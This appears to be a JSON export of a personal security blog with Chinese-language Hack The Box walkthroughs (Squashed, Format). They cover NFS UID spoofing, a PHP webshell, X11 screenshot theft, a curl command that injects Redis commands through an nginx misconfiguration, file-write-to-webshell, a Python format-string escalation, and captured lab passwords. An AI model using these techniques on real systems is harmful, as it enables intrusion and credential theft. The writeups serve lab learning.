{"meta":{"title":"Someb0dy's blog","subtitle":"","description":"Always Be Hungry,Be Foolish","author":"Someb0dy","url":"someb0dy.github.io","root":"/"},"pages":[{"title":"categories","date":"2023-06-14T06:17:42.558Z","updated":"2023-06-14T06:17:42.558Z","comments":true,"path":"categories/index.html","permalink":"someb0dy.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2023-06-14T02:34:02.537Z","updated":"2023-06-14T02:34:02.536Z","comments":false,"path":"tags/index.html","permalink":"someb0dy.github.io/tags/index.html","excerpt":"","text":"title: tagsdate: 2023-06-14 10:32:56"}],"posts":[{"title":"Squashed","slug":"Squashed","date":"2023-06-25T16:10:58.212Z","updated":"2023-06-25T16:13:26.942Z","comments":true,"path":"2023/06/26/Squashed/","link":"","permalink":"someb0dy.github.io/2023/06/26/Squashed/","excerpt":"","text":"2023年6月21日 22:43:44 Nmap┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# nmap -sCV 10.10.11.191 130 ⨯ Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 11:05 EDT Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.82% done; ETC: 11:06 (0:00:00 remaining) Nmap scan report for 10.10.11.191 Host is up (0.90s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Built Better 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 39773/tcp mountd | 100005 1,2,3 41561/udp mountd | 100005 1,2,3 46976/udp6 mountd | 100005 1,2,3 49217/tcp6 mountd | 100021 1,3,4 39445/tcp6 nlockmgr | 100021 1,3,4 41743/tcp nlockmgr | 100021 1,3,4 49344/udp6 nlockmgr | 100021 1,3,4 52702/udp nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 41.30 seconds 80 image.png 没有什么利用价值，纯静态界面 2049–NFSRefer:https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting image.png 大概的意思就是说nfs 没有基本的鉴权的功能，主要就是根据uid&#x2F;gid 来进行鉴权 msf扫描脚本 image.png mount 挂载 image.png ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine] └─# cd Squashed 1 ⨯ ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# ls ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# mkdir ross ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# mkdir html ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# ls html ross ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# mount -t nfs 10.10.11.191:/home/ross ./ross -o nolock 1 ⨯ ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# ls html ross ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# ls -al total 16 drwxr-xr-x 4 root root 4096 Jun 21 11:17 . drwxr-xr-x 33 root root 4096 Jun 21 11:17 .. drwxr-xr-x 2 root root 4096 Jun 21 11:17 html drwxr-xr-x 14 cjl cjl 4096 Jun 21 01:23 ross ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# cd ross l ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Squashed/ross] └─# ls -al total 68 drwxr-xr-x 14 cjl cjl 4096 Jun 21 01:23 . drwxr-xr-x 4 root root 4096 Jun 21 11:17 .. lrwxrwxrwx 1 root root 9 Oct 20 2022 .bash_history -&gt; /dev/null drwx------ 11 cjl cjl 4096 Oct 21 2022 .cache drwx------ 12 cjl cjl 4096 Oct 21 2022 .config drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Desktop drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Documents drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Downloads drwx------ 3 cjl cjl 4096 Oct 21 2022 .gnupg drwx------ 3 cjl cjl 4096 Oct 21 2022 .local drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Music drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Pictures drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Public drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Templates drwxr-xr-x 2 cjl cjl 4096 Oct 21 2022 Videos lrwxrwxrwx 1 root root 9 Oct 21 2022 .viminfo -&gt; /dev/null -rw------- 1 cjl cjl 57 Jun 21 01:23 .Xauthority -rw------- 1 cjl cjl 2475 Jun 21 01:23 .xsession-errors -rw------- 1 cjl cjl 2475 Dec 27 10:33 .xsession-errors.old ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Squashed/ross] └─# cd .. ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# ls html ross ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# mount -t nfs 10.10.11.191:/var/www/html ./html -o nolock ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# 挂载之后我们就可以访问 目标机器上的 &#x2F;var&#x2F;www&#x2F;html &#x2F;home&#x2F;ross image.png 进去发现文件权限都为uid&#x3D;1001所有 image.png 当我把&#x2F;etc&#x2F;passwd文件中,uid&#x3D;1001的用户的名字修改为someb0dy，并且重新挂载 发现文件所属变成someb0dy了 .Xauthority image.png 我们在&#x2F;home&#x2F;ross根目录下发现了这个文件，后续会进行利用 没有更改uid的时候都是显示权限不足 &#x2F;var&#x2F;www&#x2F;html image.png 这里可以看到挂载后的html是属于uid&#x3D;2017用户的 ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# usermod someb0dy --help Usage: usermod [options] LOGIN Options: -a, --append append the user to the supplemental GROUPS mentioned by the -G option without removing the user from other groups -b, --badname allow bad names -c, --comment COMMENT new value of the GECOS field -d, --home HOME_DIR new home directory for the user account -e, --expiredate EXPIRE_DATE set account expiration date to EXPIRE_DATE -f, --inactive INACTIVE set password inactive after expiration to INACTIVE -g, --gid GROUP force use GROUP as new primary group -G, --groups GROUPS new list of supplementary GROUPS -h, --help display this help message and exit -l, --login NEW_LOGIN new value of the login name -L, --lock lock the user account -m, --move-home move contents of the home directory to the new location (use only with -d) -o, --non-unique allow using duplicate (non-unique) UID -p, --password PASSWORD use encrypted password for the new password -P, --prefix PREFIX_DIR prefix directory where are located the /etc/* files -r, --remove remove the user from only the supplemental GROUPS mentioned by the -G option without removing the user from other groups -R, --root CHROOT_DIR directory to chroot into -s, --shell SHELL new login shell for the user account -u, --uid UID new UID for the user account -U, --unlock unlock the user account -v, --add-subuids FIRST-LAST add range of subordinate uids -V, --del-subuids FIRST-LAST remove range of subordinate uids -w, --add-subgids FIRST-LAST add range of subordinate gids -W, --del-subgids FIRST-LAST remove range of subordinate gids -Z, --selinux-user SEUSER new SELinux user mapping for the user account ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# usermod someb0dy -u 2017 ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed] └─# su someb0dy kali% idd zsh: command not found: idd kali% id uid=2017(someb0dy) gid=1001(someb0dy) groups=1001(someb0dy) kali% 进去之后我们对web根目录有着完全的权限，就可以写文件了，查看.htaccess发现支持 php的解析，上一个一句话木马 image.png 可以命令执行之后尝试反弹shell image.png image.png image.png 成功拿到user权限 rootRefer:https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing image.png 上传.Xauthority文件我们通过挂载的方式可以拿到.Xauthority 这个文件 image.png 将.Xauthority文件上传到&#x2F;目标机器home&#x2F;alex目录下 授权验证尝试 image.png image.png 我们把授权文件发送到&#x2F;home&#x2F;alex根目录下的时候直接执行 xdpyinfo -display :0 进行授权验证，并且查询相关信息的时候失败了我们看到HOME这个环境变量是空的解决方法是 export HOME&#x3D;&#x2F;home&#x2F;alex ，即把HOME这个环境变量添加上 获取屏幕截图Refer:https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing image.png 下载文件—-screenshoot.xwd通过web目录 image.png 我们直接在我们如何下载到这个文件呢！？bingo！！！ 把这个文件移动到web根目录 image.png image.png 通过nc 的命令 image.png 这样也可以将文件发送到我们自己的kaili机器上 接着使用**covert screen.xwd screen.png **转换成图片 截图的内容！有root的密码 username password root cah$mei7rai9A image.png 总结这台靶机又让我学习到一个新的攻击的点，2049 端口 NFS 协议，允许我们挂载文件到本地(但是要注意鉴权,UID&#x2F;GID)，接着进一步利用，在提权部分，对.Xauthority文件的利用也是挺有意思的，通过获取屏幕截图看到管理员将密码展示在桌面上","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"NFS,.Xauthority","slug":"NFS-Xauthority","permalink":"someb0dy.github.io/tags/NFS-Xauthority/"}]},{"title":"Format","slug":"Format","date":"2023-06-25T16:10:41.991Z","updated":"2023-06-25T16:12:05.418Z","comments":true,"path":"2023/06/26/Format/","link":"","permalink":"someb0dy.github.io/2023/06/26/Format/","excerpt":"","text":"FormatNmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.213 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 02:41 EDT Nmap scan report for localhost (10.10.11.213) Host is up (0.13s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c397ce837d255d5dedb545cdf20b054f (RSA) | 256 b3aa30352b997d20feb6758840a517c1 (ECDSA) |_ 256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Site doesn&#39;t have a title (text/html). 3000/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://microblog.htb:3000/ nmap 结果，发现一个microblog.htb域名，添加到hosts文件 80端口访问不了404，3000端口访问为 image-20230514144802252.png ](Format.assets/image-20230514144802252.png#id=DY9VX&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514145208904.png 有一套源代码，用git clone 命令下载下来 ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Format] └─# git clone http://microblog.htb:3000/cooper/microblog.git Cloning into &#39;microblog&#39;... remote: Enumerating objects: 61, done. remote: Counting objects: 100% (61/61), done. remote: Compressing objects: 100% (47/47), done. remote: Total 61 (delta 4), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (61/61), 703.74 KiB | 70.00 KiB/s, done. Resolving deltas: 100% (4/4), done. 扫描子域名果断尝试扫描子域名 ┌──(root💀kali)-[~] └─# gobuster vhost -u http://microblog.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-1 10000.txt -t 100 =============================================================== Gobuster v3.3 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://microblog.htb [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.3 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/05/14 02:47:08 Starting gobuster in VHOST enumeration mode =============================================================== Found: admin.microblog.htb Status: 200 [Size: 1588] Found: app.microblog.htb Status: 200 [Size: 3976] Found: sunny.microblog.htb Status: 200 [Size: 3732] Progress: 114257 / 114442 (99.84%)=============================================================== 2023/05/14 02:55:03 Finished =============================================================== 10.10.11.213 microblog.htb 10.10.11.213 admin.microblog.htb 10.10.11.213 app.microblog.htb 10.10.11.213 sunny.microblog.htb 一共4个域名 app.microblog.htb image-20230514162555652.png 这里有一个功能点是新增一个子域名，并且可以编辑这个子域名中一些内容 我们新增完子域名后，需要在&#x2F;etc&#x2F;hosts文件中添加解析才能访问到 点击edit site,可以修改header 和 txt 我们抓取到修改header的报文 image-20230514162816846.png 发现可以读取文件内容 原因是 ](Format.assets/image-20230514163354915.png#id=JncGI&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514163354915.png 这一次请求把&#x2F;etc&#x2F;passwd写入到order_file这个文件中去了 当我们再一次访问这个页面的时候，就会触发fetchPage这个函数 ](Format.assets/image-20230514163546376.png#id=G192Y&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514163546376.png 这个函数会调用 image-20230514163447371.png file_get_contents($line) 前面我们把&#x2F;etc&#x2F;passwd 写入到order.txt这个文件里面去了,所以这里读取到了&#x2F;etc&#x2F;passwd的内容 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin cooper:x:1000:1000::/home/cooper:/bin/bash redis:x:103:33::/var/lib/redis:/usr/sbin/nologin git:x:104:111:Git Version Control,,,:/home/git:/bin/bash messagebus:x:105:112::/nonexistent:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin _laurel:x:997:997::/var/log/laurel:/bin/false root:x:0:0:root:/root:/bin/bash cooper:x:1000:1000::/home/cooper:/bin/bash git:x:104:111:Git Version Control,,,:/home/git:/bin/bash &#x2F;etc&#x2F;nginx&#x2F;site-available&#x2F;default image.png # You should look at the following URL&#39;s in order to grasp a solid understanding # of Nginx configuration files in order to fully unleash the power of Nginx. # https://www.nginx.com/resources/wiki/start/ # https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/ # https://wiki.debian.org/Nginx/DirectoryStructure # # In most cases, administrators will remove this file from sites-enabled/ and # leave it as reference inside of sites-available where it will continue to be # updated by the nginx packaging team. # # This file will automatically load configuration files provided by other # applications, such as Drupal or Wordpress. These applications will be made # available underneath a path with that package name, such as /drupal8. # # Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples. ## # Default server configuration # server { listen 80 default_server; listen [::]:80 default_server; # SSL configuration # # listen 443 ssl default_server; # listen [::]:443 ssl default_server; # # Note: You should disable gzip for SSL traffic. # See: https://bugs.debian.org/773332 # # Read up on ssl_ciphers to ensure a secure configuration. # See: https://bugs.debian.org/765782 # # Self signed certs generated by the ssl-cert package # Don&#39;t use them in a production server! # # include snippets/snakeoil.conf; root /var/www/html; # Add index.php to the list if you are using PHP index index.html index.htm index.nginx-debian.html; server_name _; location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; } # pass PHP scripts to FastCGI server # #location ~ .php$ { # include snippets/fastcgi-php.conf; # # # With php-fpm (or other unix sockets): # fastcgi_pass unix:/run/php/php7.4-fpm.sock; # # With php-cgi (or other tcp sockets): # fastcgi_pass 127.0.0.1:9000; #} # deny access to .htaccess files, if Apache&#39;s document root # concurs with nginx&#39;s one # #location ~ /.ht { # deny all; #} } server { listen 80; listen [::]:80; root /var/www/microblog/app; index index.html index.htm index-nginx-debian.html; server_name microblog.htb; location / { return 404; } location = /static/css/health/ { resolver 127.0.0.1; proxy_pass http://css.microbucket.htb/health.txt; } location = /static/js/health/ { resolver 127.0.0.1; proxy_pass http://js.microbucket.htb/health.txt; } location ~ /static/(.*)/(.*) { resolver 127.0.0.1; proxy_pass http://$1.microbucket.htb/$2; } } image.png 这里 有一个错误的配置，可以导致对内网中redis程序进行任意命令执行Refer:https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/ image.png image.png 也就是说原本的方法的位置(GET,POST)我们改为 redis的命令而socket:后面绿色的部分 即为redis参数 ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Format/config] └─# curl -X &quot;HSET&quot; &quot;http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:somebody%20pro%20%22true%22%20/d&quot; -v * Trying 10.10.11.213:80... * Connected to microblog.htb (10.10.11.213) port 80 (#0) &gt; HSET /static/unix:%2fvar%2frun%2fredis%2fredis.sock:somebody%20pro%20%22true%22%20/d HTTP/1.1 &gt; Host: microblog.htb &gt; User-Agent: curl/7.87.0 &gt; Accept: */* &gt; * Mark bundle as not supporting multiuse &lt; HTTP/1.1 502 Bad Gateway &lt; Server: nginx/1.18.0 &lt; Date: Sat, 24 Jun 2023 07:18:42 GMT &lt; Content-Type: text/html &lt; Content-Length: 157 &lt; Connection: keep-alive &lt; &lt;html&gt; &lt;head&gt;&lt;title&gt;502 Bad Gateway&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;center&gt;&lt;h1&gt;502 Bad Gateway&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; * Connection #0 to host microblog.htb left intact curl -X &quot;Redis Command&quot; &quot;http://microblog.htb/static/unix:&lt;local Socket unix&gt;:&lt;Redis Table&gt;%20&lt;Redis Name&gt;%20%22True%22%20/AnyThings&quot; image.png 我们已经成功变成了管理员权限 image.png 有了管理员的权限后就多了一个可以edit的标签我们可以上传一个文件 image.png 直接这样上传发现失败了 protected function contraintsValidator() { /* check image for valid mime types and return mime */ $this-&gt;getImageMime($this-&gt;_files[&#39;tmp_name&#39;]); /* validate image mime type */ if (!in_array($this-&gt;mime, $this-&gt;mimeTypes)) { $this-&gt;error = sprintf(&#39;Invalid File! Only (%s) image types are allowed&#39;, implode(&#39;, &#39;, $this-&gt;mimeTypes)); return false; } /* get image sizes */ list($minSize, $maxSize) = $this-&gt;size; /* check image size based on the settings */ if ($this-&gt;_files[&#39;size&#39;] &lt; $minSize || $this-&gt;_files[&#39;size&#39;] &gt; $maxSize) { $min = $minSize.&#39; bytes (&#39;.intval($minSize / 1000).&#39; kb)&#39;; $max = $maxSize.&#39; bytes (&#39;.intval($maxSize / 1000).&#39; kb)&#39;; $this-&gt;error = &#39;Image size should be minumum &#39;.$min.&#39;, upto maximum &#39;.$max; return false; } /* check image dimension */ list($maxWidth, $maxHeight) = $this-&gt;dimensions; $this-&gt;width = $this-&gt;getWidth(); $this-&gt;height = $this-&gt;getHeight(); if ($this-&gt;height &gt; $maxHeight || $this-&gt;width &gt; $maxWidth) { $this-&gt;error = &#39;Image height/width should be less than &#39;.$maxHeight.&#39;/&#39;.$maxWidth.&#39; pixels&#39;; return false; } return true; } 这里有一段校验的代码 校验MIME 校验文件大小 校验图片的长和宽 image.png 实际MIME设置为png,Size最小为100，最大为3000000但是我们又仔细看这里其实好像上传文件名被限制死为.png了所以这个点不能利用 寻找利用点provisionProUser image.png 搜索isPro相关的内容的时候，发现这里有一个函数，是管理员才会调用就是 function provisionProUser() { if(isPro() === &quot;true&quot;) { $blogName = trim(urldecode(getBlogName())); system(&quot;chmod +w /var/www/microblog/&quot; . $blogName); system(&quot;chmod +w /var/www/microblog/&quot; . $blogName . &quot;/edit&quot;); system(&quot;cp /var/www/pro-files/bulletproof.php /var/www/microblog/&quot; . $blogName . &quot;/edit/&quot;); system(&quot;mkdir /var/www/microblog/&quot; . $blogName . &quot;/uploads &amp;&amp; chmod 700 /var/www/microblog/&quot; . $blogName . &quot;/uploads&quot;); system(&quot;chmod -w /var/www/microblog/&quot; . $blogName . &quot;/edit &amp;&amp; chmod -w /var/www/microblog/&quot; . $blogName); } return; } 给我们创建的blog的网站根目录 授予写的权限system(&quot;mkdir /var/www/microblog/&quot; . $blogName . &quot;/uploads &amp;&amp; chmod 700 /var/www/microblog/&quot; . $blogName . &quot;/uploads&quot;);这一句先创建 /var/www/microblog/我们的创建的域名/uploads这个文件夹再给/var/www/microblog/我们的创建的域名/uploads授权表示带有文件创建者具有 RWX的权限 add-headerif (isset($_POST[&#39;header&#39;]) &amp;&amp; isset($_POST[&#39;id&#39;])) { chdir(getcwd() . &quot;/../content&quot;); $html = &quot;&lt;div class = \\&quot;blog-h1 blue-fill\\&quot;&gt;&lt;b&gt;{$_POST[&#39;header&#39;]}&lt;/b&gt;&lt;/div&gt;&quot;; $post_file = fopen(&quot;{$_POST[&#39;id&#39;]}&quot;, &quot;w&quot;); fwrite($post_file, $html); fclose($post_file); $order_file = fopen(&quot;order.txt&quot;, &quot;a&quot;); fwrite($order_file, $_POST[&#39;id&#39;] . &quot;\\n&quot;); fclose($order_file); header(&quot;Location: /edit?message=Section added!&amp;status=success&quot;); } 还记得前面这个地方我们是可以LFI的吗，同时他其实也可以写文件，id和header都是我们可以控制的参数id控制写入的文件名，header控制写入的内容再加上前面给uploads这个文件夹赋予了权限，所以我们尝试写shell webshell写入 image.png . image.png image.png image.png 创建了一个abcc的子域名 image.png 发起添加header的请求，修改id和header image.png 成功执行命令 反弹shell image.png pspy记得我们在web端进行操作的时候每隔一段时间我们的用户信息和创建的子域名就会被删除，我们上pspy看一下进程 image.png 等了老长一段时间 redis-cli发现了redis-cli 连接 redis.sock keys * cooper.dooper cooper.dooper:sites type cooper.dooper hash type cooper.dooper:sites list hgetall cooper.dooper username cooper.dooper password zooperdoopercooper first-name Cooper last-name Dooper pro false LRANGE cooper.dooper:sites 0 -1 sunny 先用keys * 来看有什么键值对接着用type 命令来看 这个keys是什么类型的 hash –&gt; hgetall 查看对应的键的值 usename–&gt;cooper.dooper password–&gt;zooperdoopercooper first-name–&gt;Cooper last-name–&gt;Dooper pro–&gt;false list –&gt; 用 LRANGE 来看 所以这个list里面只有一个sunny数据 LRANGE 命令用于获取列表中指定范围内的元素，其中第二个参数为起始索引，第三个参数为结束索引。如果将第二个参数设置为 0，将第三个参数设置为 -1，则表示获取列表中所有元素。 hash 类型如果你想查看 cooper.dooper 哈希表中的所有字段和值，可以使用以下命令： redis-cli HGETALL cooper.dooper 以上命令将返回 cooper.dooper 哈希表中所有字段和对应的值。如果你只想查看 username、password、first-name 和 last-name 这些字段的值，可以使用以下命令： redis-cli HMGET cooper.dooper username password first-name last-name 以上命令中，HMGET 命令用于获取哈希表中指定字段的值，其中第二个参数为要获取的字段名。如果你想查看 pro 字段的值，可以使用以下命令： redis-cli HGET cooper.dooper pro 以上命令将返回 cooper.dooper 哈希表中 pro 字段的值。需要注意的是，在使用以上命令时，需要注意命令的使用方式和参数，以确保获取正确的信息。同时，为了保证 Redis 服务器的性能和安全性，需要对读取信息的操作进行适当的限制和控制。 list 类型如果你想查看 cooper.dooper:sites 列表中的元素 sunny 的详细信息，需要先确定这个元素的位置（即索引）。可以使用以下命令来查找元素索引： redis-cli LPOS cooper.dooper:sites sunny 以上命令中，LPOS 命令用于查找列表中第一个值与 sunny 相等的元素的索引。如果 LPOS 命令返回的索引是 n，则可以使用以下命令来获取列表中第 n 个元素的详细信息： redis-cli LINDEX cooper.dooper:sites n 以上命令将返回列表中第 n 个元素的值。需要注意的是，在使用以上命令时，需要注意命令的使用方式和参数，以确保获取正确的信息。同时，为了保证 Redis 服务器的性能和安全性，需要对读取信息的操作进行适当的限制和控制。 username password cooper.dooper zooperdoopercooper image.png 成功拿到user权限 root image.png cooper@format:/usr/bin$ sudo -l Matching Defaults entries for cooper on format: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User cooper may run the following commands on format: (root) /usr/bin/license cooper@format:/usr/bin$ file /usr/bin/license /usr/bin/license: Python script, ASCII text executable #!/usr/bin/python3 import base64 from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC from cryptography.fernet import Fernet import random import string from datetime import date import redis import argparse import os import sys class License(): def __init__(self): chars = string.ascii_letters + string.digits + string.punctuation self.license = &#39;&#39;.join(random.choice(chars) for i in range(40)) self.created = date.today() if os.geteuid() != 0: print(&quot;&quot;) print(&quot;Microblog license key manager can only be run as root&quot;) print(&quot;&quot;) sys.exit() parser = argparse.ArgumentParser(description=&#39;Microblog license key manager&#39;) group = parser.add_mutually_exclusive_group(required=True) group.add_argument(&#39;-p&#39;, &#39;--provision&#39;, help=&#39;Provision license key for specified user&#39;, metavar=&#39;username&#39;) group.add_argument(&#39;-d&#39;, &#39;--deprovision&#39;, help=&#39;Deprovision license key for specified user&#39;, metavar=&#39;username&#39;) group.add_argument(&#39;-c&#39;, &#39;--check&#39;, help=&#39;Check if specified license key is valid&#39;, metavar=&#39;license_key&#39;) args = parser.parse_args() r = redis.Redis(unix_socket_path=&#39;/var/run/redis/redis.sock&#39;) secret = [line.strip() for line in open(&quot;/root/license/secret&quot;)][0] secret_encoded = secret.encode() salt = b&#39;microblogsalt123&#39; kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend()) encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded)) f = Fernet(encryption_key) l = License() #provision if(args.provision): user_profile = r.hgetall(args.provision) if not user_profile: print(&quot;&quot;) print(&quot;User does not exist. Please provide valid username.&quot;) print(&quot;&quot;) sys.exit() existing_keys = open(&quot;/root/license/keys&quot;, &quot;r&quot;) all_keys = existing_keys.readlines() for user_key in all_keys: if(user_key.split(&quot;:&quot;)[0] == args.provision): print(&quot;&quot;) print(&quot;License key has already been provisioned for this user&quot;) print(&quot;&quot;) sys.exit() prefix = &quot;microblog&quot; username = r.hget(args.provision, &quot;username&quot;).decode() firstlast = r.hget(args.provision, &quot;first-name&quot;).decode() + r.hget(args.provision, &quot;last-name&quot;).decode() license_key = (prefix + username + &quot;{license.license}&quot; + firstlast).format(license=l) print(&quot;&quot;) print(&quot;Plaintext license key:&quot;) print(&quot;------------------------------------------------------&quot;) print(license_key) print(&quot;&quot;) license_key_encoded = license_key.encode() license_key_encrypted = f.encrypt(license_key_encoded) print(&quot;Encrypted license key (distribute to customer):&quot;) print(&quot;------------------------------------------------------&quot;) print(license_key_encrypted.decode()) print(&quot;&quot;) with open(&quot;/root/license/keys&quot;, &quot;a&quot;) as license_keys_file: license_keys_file.write(args.provision + &quot;:&quot; + license_key_encrypted.decode() + &quot;\\n&quot;) #deprovision if(args.deprovision): print(&quot;&quot;) print(&quot;License key deprovisioning coming soon&quot;) print(&quot;&quot;) sys.exit() #check if(args.check): print(&quot;&quot;) try: license_key_decrypted = f.decrypt(args.check.encode()) print(&quot;License key valid! Decrypted value:&quot;) print(&quot;------------------------------------------------------&quot;) print(license_key_decrypted.decode()) except: print(&quot;License key invalid&quot;) print(&quot;&quot;) license_key = (prefix + username + &quot;{license.license}&quot; + firstlast).format(license=l) 最重要的就是这一行，使用了format 这里存在format格式化字符串漏洞，这也是本靶机名字的来源Refer:https://podalirius.net/en/articles/python-format-string-vulnerabilities/https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/ image.png image.png image.png 其中密码是secret:unCR4ckaBL3Pa$$w0rd尝试切换root成功","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"Redis,NginxMisconfigure","slug":"Redis-NginxMisconfigure","permalink":"someb0dy.github.io/tags/Redis-NginxMisconfigure/"}]},{"title":"SandWorm","slug":"SandWorm","date":"2023-06-25T16:10:34.992Z","updated":"2023-06-25T16:12:50.439Z","comments":true,"path":"2023/06/26/SandWorm/","link":"","permalink":"someb0dy.github.io/2023/06/26/SandWorm/","excerpt":"","text":"2023年6月18日 10:10:16 Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.218 130 ⨯ Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 22:09 EDT Nmap scan report for 10.10.11.218 Host is up 